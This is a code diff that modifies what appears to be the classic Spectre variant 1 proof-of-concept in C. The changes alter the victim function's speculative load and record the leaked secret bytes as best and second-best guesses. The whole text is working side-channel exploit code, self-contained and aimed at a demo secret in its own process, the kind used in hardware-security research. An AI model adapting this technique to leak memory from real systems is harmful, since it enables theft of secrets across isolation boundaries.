@@ -45,7 +45,7 @@ Victim code.
 ********************************************************************/
 unsigned int array1_size = 16;
 uint8_t unused1[64];
-uint8_t array1[16] = {
+uint32_t array1[16] = {
   1,
   2,
   3,
@@ -64,9 +64,53 @@ uint8_t array1[16] = {
   16
 };
 uint8_t unused2[64];
-uint8_t array2[256 * 512];
+uint8_t array2[256 * 512] = {0};
 
-char * secret = "The Magic Words are Squeamish Ossifrage.";
+char * secret_string       = "The Magic Words are Squeamish Ossifrage.";
+const uint32_t secret[]     =
+{'T',
+  'h',
+  'e',
+  ' ',
+  'M',
+  'a',
+  'g',
+  'i',
+  'c',
+  ' ',
+  'W',
+  'o',
+  'r',
+  'd',
+  's',
+  ' ',
+  'a',
+  'r',
+  'e',
+  ' ',
+  'S',
+  'q',
+  'u',
+  'e',
+  'a',
+  'm',
+  'i',
+  's',
+  'h',
+  ' ',
+  'O',
+  's',
+  's',
+  'i',
+  'f',
+  'r',
+  'a',
+  'g',
+  'e',
+  '.',
+};
+char   best_guess[] = "                                        ";
+char   second_guess[]="                                        ";
 
 uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */
 
@@ -95,6 +139,11 @@ static inline unsigned long array_index_mask_nospec(unsigned long index,
 #endif
 
 void victim_function(size_t x) {
+  volatile int dropbag;
+  volatile int fakebag = 0;
+  volatile int jawbag = 'D';
+  volatile int* p = &fakebag;
+  dropbag = 0;
   if (x < array1_size) {
 #ifdef INTEL_MITIGATION
 		/*
@@ -109,8 +158,9 @@ void victim_function(size_t x) {
 #ifdef LINUX_KERNEL_MITIGATION
     x &= array_index_mask_nospec(x, array1_size);
 #endif
-    temp &= array2[array1[x] * 512];
-  }
+    dropbag = array1[x]+1;
+  } else { dropbag = 0; }
+  temp &= array2[(*(p-1)-1) * 512];
 }
 
 
@@ -288,7 +338,7 @@ int main(int argc,
   int cache_hit_threshold = 80;
 
   /* Default for malicious_x is the secret string address */
-  size_t malicious_x = (size_t)(secret - (char * ) array1);
+  size_t malicious_x = (size_t)(secret -  array1);
   
   /* Default addresses to read is 40 (which is the length of the secret string) */
   int len = 40;
@@ -365,6 +415,7 @@ int main(int argc,
   printf("Reading %d bytes:\n", len);
 
   /* Start the read loop to read each address */
+  i = 0;
   while (--len >= 0) {
     printf("Reading at malicious_x = %p... ", (void * ) malicious_x);
 
@@ -376,15 +427,21 @@ int main(int argc,
 
     /* Display the results */
     printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
+    char guess = value[0] > 31 && value[0] < 127 ? value[0] : ' ';
     printf("0x%02X=’%c’ score=%d ", value[0],
-      (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
+      guess, score[0]);
+    best_guess[i] = guess;
     
     if (score[1] > 0) {
+      guess = value[1] > 31 && value[1] < 127 ? value[1] : ' ';
       printf("(second best: 0x%02X=’%c’ score=%d)", value[1],
-      (value[1] > 31 && value[1] < 127 ? value[1] : '?'), score[1]);
+        guess, score[1]);
+      second_guess[i] = guess;
     }
 
+    i++;
     printf("\n");
   }
+  printf("%s\n%s\n%s\n", secret_string, best_guess, second_guess);
   return (0);
 }
